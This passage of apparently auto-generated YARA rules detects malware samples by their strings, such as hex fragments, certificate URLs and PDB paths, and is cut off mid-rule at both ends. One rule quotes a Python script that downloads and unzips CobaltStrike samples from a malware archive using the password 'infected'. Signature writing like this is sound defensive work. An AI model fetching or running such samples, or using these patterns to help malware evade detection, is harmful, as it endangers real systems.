      $s2 = "@muuid_exec_bin.nim.c" fullword ascii /* score: '18.00'*/
      $s3 = "512b385a2c44" ascii /* score: '17.00'*/ /* hex encoded string 'Q+8Z,D' */
      $s4 = "585e4a6d4277" ascii /* score: '17.00'*/ /* hex encoded string 'X^JmBw' */
      $s5 = "7a566e5d217d" ascii /* score: '17.00'*/ /* hex encoded string 'zVn]!}' */
      $s6 = "656b7e2d304e" ascii /* score: '17.00'*/ /* hex encoded string 'ek~-0N' */
      $s7 = "6e2d6a564368" ascii /* score: '17.00'*/ /* hex encoded string 'n-jVCh' */
      $s8 = "7250622d3727" ascii /* score: '17.00'*/ /* hex encoded string 'rPb-7'' */
      $s9 = "3a33683b3d75" ascii /* score: '17.00'*/ /* hex encoded string ':3h;=u' */
      $s10 = "32202d00323e" ascii /* score: '17.00'*/ /* hex encoded string '2 -2>' */
      $s11 = "3a336c3e4e56" ascii /* score: '17.00'*/ /* hex encoded string ':3l>NV' */
      $s12 = "7353602f5858" ascii /* score: '17.00'*/ /* hex encoded string 'sS`/XX' */
      $s13 = "616d21583424" ascii /* score: '17.00'*/ /* hex encoded string 'am!X4$' */
      $s14 = "67376f717950" ascii /* score: '17.00'*/ /* hex encoded string 'g7oqyP' */
      $s15 = "4c5f5d795248" ascii /* score: '17.00'*/ /* hex encoded string 'L_]yRH' */
      $s16 = "787a67354729" ascii /* score: '17.00'*/ /* hex encoded string 'xzg5G)' */
      $s17 = "4d4e67506972" ascii /* score: '17.00'*/ /* hex encoded string 'MNgPir' */
      $s18 = "3c6a3534496b" ascii /* score: '17.00'*/ /* hex encoded string '<j54Ik' */
      $s19 = "37352f7d5233" ascii /* score: '17.00'*/ /* hex encoded string '75/}R3' */
      $s20 = "7d747e536a65" ascii /* score: '17.00'*/ /* hex encoded string '}t~Sje' */
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      8 of them
}

rule sig_3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0 {
   meta:
      description = "dataset - file 3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADb" fullword ascii /* score: '27.00'*/
      $s2 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s3 = "V68SPNq.exe" fullword wide /* score: '22.00'*/
      $s4 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s5 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s6 = "dohteMteG" fullword wide /* reversed goodware string 'GetMethod' */ /* score: '14.00'*/
      $s7 = "get_QuantityPerUnit" fullword ascii /* score: '12.00'*/
      $s8 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii /* score: '11.00'*/
      $s9 = "My.Computer" fullword ascii /* score: '11.00'*/
      $s10 = "MyTemplate" fullword ascii /* score: '11.00'*/
      $s11 = "FrameReadyEvent" fullword ascii /* score: '10.00'*/
      $s12 = "FrameReadyEventHandler" fullword ascii /* score: '10.00'*/
      $s13 = "remove_FrameReady" fullword ascii /* score: '10.00'*/
      $s14 = "System.Windows.Forms.Form" fullword ascii /* score: '10.00'*/
      $s15 = "add_FrameReady" fullword ascii /* score: '10.00'*/
      $s16 = "Completionlist" fullword ascii /* score: '9.00'*/
      $s17 = "SqlServerOperations" fullword ascii /* score: '9.00'*/
      $s18 = "get_UnitsOnOrder" fullword ascii /* score: '9.00'*/
      $s19 = "get_UnitPrice" fullword ascii /* score: '9.00'*/
      $s20 = "get_UnitsInStock" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule fee6b3937d208b95c17dc253ba951f3c7c5a332af98f4e0117ee5bbd47e38843 {
   meta:
      description = "dataset - file fee6b3937d208b95c17dc253ba951f3c7c5a332af98f4e0117ee5bbd47e38843"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "fee6b3937d208b95c17dc253ba951f3c7c5a332af98f4e0117ee5bbd47e38843"
   strings:
      $s1 = "Mightywill.QA.CrashReport.exe" fullword wide /* score: '22.00'*/
      $s2 = ",https://www.example.com/my_product/info.html0" fullword ascii /* score: '17.00'*/
      $s3 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC90.DebugMFC\" version=\"9.0.21022.8\" processorArchitecture=\"x86\" pu" ascii /* score: '15.00'*/
      $s4 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC90.DebugCRT\" version=\"9.0.21022.8\" processorArchitecture=\"x86\" pu" ascii /* score: '15.00'*/
      $s5 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s6 = "http://www.digicert.com/CPS0" fullword ascii /* score: '13.00'*/
      $s7 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC90.DebugCRT\" version=\"9.0.21022.8\" processorArchitecture=\"x86\" pu" ascii /* score: '12.00'*/
      $s8 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC90.DebugMFC\" version=\"9.0.21022.8\" processorArchitecture=\"x86\" pu" ascii /* score: '12.00'*/
      $s9 = "ygetji6" fullword ascii /* score: '10.00'*/
      $s10 = "oBs.ijs~" fullword ascii /* score: '7.00'*/
      $s11 = "NEJCHFGNUATBMYBQWL" fullword ascii /* score: '6.50'*/
      $s12 = "Mightywill" fullword wide /* score: '6.00'*/
      $s13 = "NEJCHFGNUATBMYBQWL0" fullword ascii /* score: '5.00'*/
      $s14 = "mKN@ -):oc^" fullword ascii /* score: '5.00'*/
      $s15 = "QHma6c " fullword ascii /* score: '4.00'*/
      $s16 = "peareFireA" fullword ascii /* score: '4.00'*/
      $s17 = "iKifi;g" fullword ascii /* score: '4.00'*/
      $s18 = "wVurZ]t" fullword ascii /* score: '4.00'*/
      $s19 = "kBoJnkee" fullword ascii /* score: '4.00'*/
      $s20 = "Dre{NibLdry" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule sig_7a51bf0527aa3f38ee5a9ae52c1a4f63d67d68af2da7b488f8ba7b66d665e618 {
   meta:
      description = "dataset - file 7a51bf0527aa3f38ee5a9ae52c1a4f63d67d68af2da7b488f8ba7b66d665e618"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7a51bf0527aa3f38ee5a9ae52c1a4f63d67d68af2da7b488f8ba7b66d665e618"
   strings:
      $s1 = "IMINIMAL_PATH=1 @@COMSPEC@@ /K \"doskey git=^\"@@EXEPATH@@\\cmd\\git.exe^\" $*\"" fullword wide /* score: '23.00'*/
      $s2 = "git.exe" fullword wide /* score: '19.00'*/
      $s3 = "https://sectigo.com/CPS0" fullword ascii /* score: '17.00'*/
      $s4 = "https://sectigo.com/CPS0D" fullword ascii /* score: '17.00'*/
      $s5 = "2http://crl.comodoca.com/AAACertificateServices.crl04" fullword ascii /* score: '16.00'*/
      $s6 = "3http://crt.usertrust.com/USERTrustRSAAddTrustCA.crt0%" fullword ascii /* score: '16.00'*/
      $s7 = "?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl0v" fullword ascii /* score: '16.00'*/
      $s8 = "        <requestedExecutionLevel level=\"asInvoker\"/>" fullword ascii /* score: '15.00'*/
      $s9 = "http://ocsp.sectigo.com0" fullword ascii /* score: '14.00'*/
      $s10 = "3http://crl.sectigo.com/SectigoRSATimeStampingCA.crl0t" fullword ascii /* score: '13.00'*/
      $s11 = "2http://crl.sectigo.com/SectigoRSACodeSigningCA.crl0s" fullword ascii /* score: '13.00'*/
      $s12 = "2http://crt.sectigo.com/SectigoRSACodeSigningCA.crt0#" fullword ascii /* score: '13.00'*/
      $s13 = "3http://crt.sectigo.com/SectigoRSATimeStampingCA.crt0#" fullword ascii /* score: '13.00'*/
      $s14 = "euHVp:\\>N" fullword ascii /* score: '10.00'*/
      $s15 = "!\\[7&b![" fullword ascii /* score: '9.00'*/ /* hex encoded string '{' */
      $s16 = "* p4DX" fullword ascii /* score: '9.00'*/
      $s17 = "The Git Development Community" fullword wide /* score: '9.00'*/
      $s18 = "      <!--The ID below indicates application support for Windows 10 -->" fullword ascii /* score: '7.00'*/
      $s19 = "      <!--The ID below indicates application support for Windows Vista -->" fullword ascii /* score: '7.00'*/
      $s20 = "  <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      8 of them
}

rule ___dataset_main {
   meta:
      description = "dataset - file main.py"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "9c2cdefb7609ad7e81a6883593ff9c9bd3f6742ec2df88315d6b1300b6e8bb4a"
   strings:
      $s1 = "password = \"infected\"" fullword ascii /* score: '17.00'*/
      $s2 = "# Download and unzip" fullword ascii /* score: '14.00'*/
      $s3 = "response = requests.get(url)" fullword ascii /* score: '12.00'*/
      $s4 = "def extract_7z(file_path, extract_path, password=None):" fullword ascii /* score: '12.00'*/
      $s5 = "url = \"https://samples.vx-underground.org/samples/Families/CobaltStrike/\"" fullword ascii /* score: '10.00'*/
      $s6 = "def download_file(url, save_path):" fullword ascii /* score: '10.00'*/
      $s7 = "import requests" fullword ascii /* score: '9.00'*/
      $s8 = "import py7zr" fullword ascii /* score: '7.00'*/
      $s9 = "from bs4 import BeautifulSoup" fullword ascii /* score: '7.00'*/
      $s10 = "    href = link.get(\"href\")" fullword ascii /* score: '7.00'*/
      $s11 = "    with py7zr.SevenZipFile(file_path, mode=\"r\", password=password) as z:" fullword ascii /* score: '7.00'*/
      $s12 = "    extract_7z(save_file_path, directory, password)" fullword ascii /* score: '7.00'*/
      $s13 = "    response = requests.get(url)" fullword ascii /* score: '7.00'*/
      $s14 = "    download_file(file_url, save_file_path)" fullword ascii /* score: '5.00'*/
      $s15 = "    # download 7z" fullword ascii /* score: '5.00'*/
      $s16 = "for link in soup.find_all(\"a\"):" fullword ascii /* score: '4.00'*/
      $s17 = "soup = BeautifulSoup(html, \"html.parser\")" fullword ascii /* score: '4.00'*/
      $s18 = "directory = \"./\"" fullword ascii /* score: '4.00'*/
      $s19 = "for file_url in file_urls:" fullword ascii /* score: '4.00'*/
      $s20 = "file_urls = []" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6d69 and filesize < 3KB and
      8 of them
}

rule sig_2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4bafd03 {
   meta:
      description = "dataset - file 2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4bafd03"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4bafd03"
   strings:
      $x1 = "C:\\Windows\\System32\\svchost.exe" fullword ascii /* score: '34.00'*/
      $s2 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s3 = "11C5FDA3F333BCEB7154099F5016CF5C17A7D0E6F5B5E9E6172BE5123A5105A77AE68CED49F05345B7D1342D10A8598C309BDB314A61373D9C1321D51A9F6A4E" ascii /* score: '11.00'*/
      $s4 = "E684ABF7886A53133992D912352CF459143866CB5378E79F0AFE931C3EE137B0AB0B79C38CFAE84AC661D816EB286EFE12E04842D056B8B745A17D3448EA2D29" ascii /* score: '11.00'*/
      $s5 = "D022EDD8D423085A0129981E88F44777320A19D57326F40EDEE5B3FD2A9B247520736C0C261B3561AB7187994515AB696341BF5747EB970DF929E3DFA4712027" ascii /* score: '11.00'*/
      $s6 = "3FD1DFDD05A39604D3D1146699038C3182625926EFF5A522451A8446CFDDBC52D5F143497CE1997EEF7024C2BF908BC9A4DDE037812427156E6EF40FF48111B3" ascii /* score: '11.00'*/
      $s7 = "AB1278CBC69E37ED9C30902029AD1398462AC24550411A776496240F5741AAF57BA8BD634344E5A1D1E60A4A92D237B839D7A6B0D3E51DDDC7F259A51D5AE8DE" ascii /* score: '11.00'*/
      $s8 = "01D2482884F94A660D2DEC0E6156B6B0398CC5AD9F0BB9F708D756DD089B469B05BEDAA50F8F5CB65FB385684021882515DD9DE75CF238918DED900A06200228" ascii /* score: '11.00'*/
      $s9 = "C1A01E0D63DCDD5DE69FB2090F16BC6108E8FD36126F73D1B06845DF1683EB7EF75988DC7407A65123727FF84DA23A656D511CCF19079959C7DCBE05FE848358" ascii /* score: '11.00'*/
      $s10 = "C07265788417B039E5FA2E5075B01C6FC1364064B4F1B775E6730675157BE357ABEF85F58901E8A86C3714C7611A14C844B158316681E29F4C4B15099296B8F1" ascii /* score: '11.00'*/
      $s11 = "1714E0E5C5C8FBD628F52D68BD29D363051A7B551F01474A53996ADF1DAC9F07CD1D11BD6105FCE44DD688BBC5AEF8E91B0261E02B2BECE6BA02520CC1E2171C" ascii /* score: '11.00'*/
      $s12 = "4F8A2F67A6D3E45C351800680574D1A5ECE90084FCD861E3A35644656BCD9D9192C727C8E6EEBDE0C39856BF24CB9E9F1A87B60A13F8F947AB05DF04017E66A4" ascii /* score: '11.00'*/
      $s13 = "F8746D773A1A09EA69223321BFC65E549F123D7173A977884ADC5EDEF23ED3CB44964CC9C3A4F45199E15C7D9198404D0397D02B3D68F4CC6868BAB2E322C388" ascii /* score: '11.00'*/
      $s14 = "221611127A9F97B11EFB2B7881CF1919A3321542D74DE6152A14CE0381035F2C24036286F2ADFD6E1298D6F92EDC85CEE71175E8173B11465101CB5C7A81661A" ascii /* score: '11.00'*/
      $s15 = "779E7A0826D46FC6042C93AB6FBA1D12F116AE37C7B60A593C2098776B90E12113FBE1C6859780408D730E875197F010ABDE6E57A96A86A9DF9398D6C657DC92" ascii /* score: '11.00'*/
      $s16 = "4B646E647C50C805792ADABC7B2D58A44E704402E881AD0FFAB27FACDCB66A0A0D17A6D7C94A65F9881C0BB68AAFE9C294C1C190E7A0EF322FD0DBF0C62CDD7D" ascii /* score: '11.00'*/
      $s17 = "0DC5EAEBA619FEB04683CCC45C6E8F8B511EAE2D5C4E8DB6DBB28FFA4BDB712444445DFB98638B794F18D715313FA07114562E553483A626D0F5C723AC83271E" ascii /* score: '11.00'*/
      $s18 = "538D5767963C09751DB7CF4DD073654053F73B6EC73145A1000B85880E9A9BCBBDB2A0D9F843275A0C907768C2BCFE299B5D5884A9F8261DBB22C83F4F5AFCEA" ascii /* score: '11.00'*/
      $s19 = "F7D8D55B1ADD41C9078F2792F83E4AD6D106954E1E76C86C050EB42B4218165FBCC627218BD7897A01F2F65258F7293E279BA68801E374F697C0CEDE70F92ED8" ascii /* score: '11.00'*/
      $s20 = "06FD6F2607424F0D7B3C8128B62227F94E6AD42DB7D628009067CDE6AFAA9CBEF2ECC64225F538A225B56CE7C76C21D4B9B7E380B7A8004EEC884AA686594965" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_6402b33d729c8bb44881747a8f397f4aec408bf5e18b9af6fd86cdfa3f96323b {
   meta:
      description = "dataset - file 6402b33d729c8bb44881747a8f397f4aec408bf5e18b9af6fd86cdfa3f96323b"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "6402b33d729c8bb44881747a8f397f4aec408bf5e18b9af6fd86cdfa3f96323b"
   strings:
      $s1 = "Seven.dll" fullword wide /* score: '23.00'*/
      $s2 = "c:\\blue\\720\\Since\\Danger_Board\\984\\Seven.pdb" fullword ascii /* score: '20.00'*/
      $s3 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s4 = ">(>6>E>~>" fullword ascii /* score: '9.00'*/ /* hex encoded string 'n' */
      $s5 = ": :(:0:8:<:@:H:\\:d:x:" fullword ascii /* score: '7.00'*/
      $s6 = "Young Neckcompare make" fullword wide /* score: '7.00'*/
      $s7 = "Copyright 2002, Young Neckcompare make" fullword wide /* score: '7.00'*/
      $s8 = "AEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE" ascii /* score: '6.50'*/
      $s9 = "Ranexample" fullword ascii /* score: '6.00'*/
      $s10 = "Liemore" fullword ascii /* score: '6.00'*/
      $s11 = "Morningthere" fullword ascii /* score: '6.00'*/
      $s12 = "Herevalue" fullword ascii /* score: '6.00'*/
      $s13 = "Weregentle" fullword ascii /* score: '6.00'*/
      $s14 = "Tryconsonant" fullword ascii /* score: '6.00'*/
      $s15 = "FHtEHLX\"" fullword ascii /* score: '4.00'*/
      $s16 = "20I0Z0" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s17 = "KtHi$HH" fullword ascii /* score: '4.00'*/
      $s18 = "IEEEEE%" fullword ascii /* score: '4.00'*/
      $s19 = "YKDODOH\\" fullword ascii /* score: '4.00'*/
      $s20 = "HhHH L " fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      8 of them
}

rule sig_2edaa2518d319f9c0e97e337c7b41921477d857af96018f56207c5abdad74c38 {
   meta:
      description = "dataset - file 2edaa2518d319f9c0e97e337c7b41921477d857af96018f56207c5abdad74c38"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "2edaa2518d319f9c0e97e337c7b41921477d857af96018f56207c5abdad74c38"
   strings:
      $s1 = "TCommonDialoglcB" fullword ascii /* score: '12.00'*/
      $s2 = "0M0W0n0" fullword ascii /* reversed goodware string '0n0W0M0' */ /* score: '11.00'*/
      $s3 = "* {r^i+" fullword ascii /* score: '9.00'*/
      $s4 = "=#=(=2=8=@=" fullword ascii /* score: '9.00'*/ /* hex encoded string '(' */
      $s5 = "OnGetSiteInfo$" fullword ascii /* score: '9.00'*/
      $s6 = "zdelzle" fullword ascii /* score: '8.00'*/
      $s7 = "dsuugmqf" fullword ascii /* score: '8.00'*/
      $s8 = "EVariantBadVarTypeError@" fullword ascii /* score: '7.00'*/
      $s9 = "TComponent(\"A" fullword ascii /* score: '7.00'*/
      $s10 = "TConversionh" fullword ascii /* score: '7.00'*/
      $s11 = ": :$:(:,:0:4:8:<:@:D:H:L:P:T:X:\\:`:d:h:r:v:" fullword ascii /* score: '7.00'*/
      $s12 = ":&:.:6:C:O:\\:n:" fullword ascii /* score: '7.00'*/
      $s13 = "AutoHotkeys DD" fullword ascii /* score: '7.00'*/
      $s14 = ":\":4:E:I:\\:l:|:" fullword ascii /* score: '7.00'*/
      $s15 = "TCustomLabel8" fullword ascii /* score: '5.00'*/
      $s16 = "XeHeiQ1" fullword ascii /* score: '5.00'*/
      $s17 = "==5=A=\\=" fullword ascii /* score: '5.00'*/ /* hex encoded string 'Z' */
      $s18 = "ipgume" fullword ascii /* score: '5.00'*/
      $s19 = "+ 8%X7" fullword ascii /* score: '5.00'*/
      $s20 = "TInterfacedPersistent0" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_61dc296d1b2aa4724f3b0a44a53863613d61df9de4ee8e0a01f2d33b80169a4d {
   meta:
      description = "dataset - file 61dc296d1b2aa4724f3b0a44a53863613d61df9de4ee8e0a01f2d33b80169a4d"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "61dc296d1b2aa4724f3b0a44a53863613d61df9de4ee8e0a01f2d33b80169a4d"
   strings:
      $s1 = "FopDemo.exe" fullword ascii /* score: '22.00'*/
      $s2 = "FopDemo.EXE" fullword wide /* score: '22.00'*/
      $s3 = "This code allows to copy, move or delete files or directories (with subdirectories and files) without using SHFileOperation func" ascii /* score: '12.00'*/
      $s4 = "tion. If 'AskIfReadonly' flag is set then during delete operation warning message will be shown. During move operation this flag" ascii /* score: '12.00'*/
      $s5 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s6 = "Wrong operation" fullword ascii /* score: '9.00'*/
      $s7 = "This code allows to copy, move or delete files or directories (with subdirectories and files) without using SHFileOperation func" ascii /* score: '9.00'*/
      $s8 = " is read olny. Do you want delete it?" fullword ascii /* score: '7.00'*/
      $s9 = "be copied as new file with name 'Copy of ORIGINAL_FILE_NAME'. If this file already exist it will be copied as 'Copy (2) of ORIGI" ascii /* score: '7.00'*/
      $s10 = "FopDemo Version 1.0" fullword wide /* score: '7.00'*/
      $s11 = "Ask if readonly" fullword wide /* score: '7.00'*/
      $s12 = "DINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPAD" ascii /* score: '6.50'*/
      $s13 = "DINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADD" fullword ascii /* score: '6.50'*/
      $s14 = "%s%d%s%s%s" fullword ascii /* score: '5.00'*/
      $s15 = "|$Xt=H" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s16 = "Copyright (C) 2004" fullword wide /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s17 = "l$(Lcm" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s18 = " ignorable. If 'OverwriteMode' flag is set then if you copy file to the existing file it will overwrite it. Otherwise file will " ascii /* score: '4.00'*/
      $s19 = "_9@p2b%VzAgXREk++98DLkTW8i^ioQN8vlqpWr3mrpeU6p!CP^&EA6FlJcJiG0YRe9Dv" fullword ascii /* score: '4.00'*/
      $s20 = ":MZHcI<u\"" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae1887900d763b {
   meta:
      description = "dataset - file a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae1887900d763b"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae1887900d763b"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s2 = "  <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->" fullword ascii /* score: '25.00'*/
      $s3 = "JumboSports.frmLoginMenu.resources" fullword ascii /* score: '21.00'*/
      $s4 = "get_frmLoginMenu" fullword ascii /* score: '20.00'*/
      $s5 = "get_btnNoLoginPVP" fullword ascii /* score: '20.00'*/
      $s6 = "get_btnToLoginMenu" fullword ascii /* score: '20.00'*/
      $s7 = "get_btnLogin" fullword ascii /* score: '20.00'*/
      $s8 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s9 = "5BSj7Yh.exe" fullword wide /* score: '19.00'*/
      $s10 = "Login Failed" fullword wide /* score: '18.00'*/
      $s11 = "get_tbxPassword" fullword ascii /* score: '17.00'*/
      $s12 = "get_btnUserSelectTournament" fullword ascii /* score: '17.00'*/
      $s13 = "get_tbxPasswordCfrm" fullword ascii /* score: '17.00'*/
      $s14 = "get_btnClearSlelectedUsers" fullword ascii /* score: '17.00'*/
      $s15 = "get_btnUserSelectPvP" fullword ascii /* score: '17.00'*/
      $s16 = "get_lblPassword" fullword ascii /* score: '17.00'*/
      $s17 = "Select tblUserData.UserName, tblUserData.HashedPassword, tblUserData.DateOfCreation" fullword wide /* score: '16.00'*/
      $s18 = "SELECT tblUserData.UserName, tblUserData.HashedPassword, tblUserData.DateOfCreation" fullword wide /* score: '16.00'*/
      $s19 = "pWordLogin" fullword ascii /* score: '15.00'*/
      $s20 = "set_frmLoginMenu" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076 {
   meta:
      description = "dataset - file e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076"
   strings:
      $s1 = "TestPrintForm.dll" fullword ascii /* score: '23.00'*/
      $s2 = "TestPrintForm.EXE" fullword wide /* score: '22.00'*/
      $s3 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s4 = "C:\\Program Files (x86)\\Microsoft Visual Studio 9.0\\VC\\atlmfc\\include\\afxwin1.inl" fullword ascii /* score: '13.00'*/
      $s5 = "testform1.prx" fullword ascii /* score: '10.00'*/
      $s6 = "testform2.prx" fullword ascii /* score: '10.00'*/
      $s7 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s8 = " /p \"%1\"" fullword ascii /* score: '9.00'*/
      $s9 = "Test dialog singleitem page" fullword ascii /* score: '9.00'*/
      $s10 = "Test dialog multiitem pages" fullword ascii /* score: '9.00'*/
      $s11 = "Dialog Print" fullword wide /* score: '9.00'*/
      $s12 = "Test dialog print" fullword wide /* score: '9.00'*/
      $s13 = "Check this to print the list content" fullword wide /* score: '9.00'*/
      $s14 = "testpage" fullword ascii /* score: '8.00'*/
      $s15 = "%d minuti, %d secondi" fullword ascii /* score: '7.00'*/
      $s16 = "TestPrintForm Versione 1.0" fullword wide /* score: '7.00'*/
      $s17 = "TestPrintForm.Document" fullword wide /* score: '7.00'*/
      $s18 = "?Passa al riquadro della finestra successivo" fullword wide /* score: '7.00'*/
      $s19 = "Subform" fullword ascii /* score: '6.00'*/
      $s20 = "senza nome" fullword ascii /* score: '6.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule sig_2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9 {
   meta:
      description = "dataset - file 2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9"
   strings:
      $s1 = "Detrimon.dll" fullword ascii /* score: '23.00'*/
      $s2 = "K:\\Detrimon\\x64\\Release\\Detrimon.pdb" fullword ascii /* score: '19.00'*/
      $s3 = "Tab.exe" fullword wide /* score: '19.00'*/
      $s4 = "http://www.digicert.com/CPS0" fullword ascii /* score: '17.00'*/
      $s5 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C" fullword ascii /* score: '16.00'*/
      $s6 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii /* score: '16.00'*/
      $s7 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s8 = "numMutex" fullword ascii /* score: '15.00'*/
      $s9 = "http://ocsp.digicert.com0\\" fullword ascii /* score: '14.00'*/
      $s10 = "http://www.digicert.com/CPS0" fullword ascii /* score: '13.00'*/
      $s11 = "Phttp://cacerts.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crt0" fullword ascii /* score: '13.00'*/
      $s12 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0=" fullword ascii /* score: '13.00'*/
      $s13 = "Mhttp://crl3.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0S" fullword ascii /* score: '13.00'*/
      $s14 = "C:\\Program Files (x86)\\Microsoft Visual Studio 9.0\\VC\\atlmfc\\include\\afxwin1.inl" fullword ascii /* score: '13.00'*/
      $s15 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s16 = "G(---  ---(G" fullword ascii /* score: '9.00'*/
      $s17 = "Tab Version 1.0" fullword wide /* score: '7.00'*/
      $s18 = "DINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPAD" ascii /* score: '6.50'*/
      $s19 = "OOOOOOJ" fullword ascii /* score: '6.50'*/
      $s20 = "DINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGX" fullword ascii /* score: '6.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_35e5460c102ca2f996d61d70d6bb06fb87014f7d2beccf35f3812ea534acd9d5 {
   meta:
      description = "dataset - file 35e5460c102ca2f996d61d70d6bb06fb87014f7d2beccf35f3812ea534acd9d5"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "35e5460c102ca2f996d61d70d6bb06fb87014f7d2beccf35f3812ea534acd9d5"
   strings:
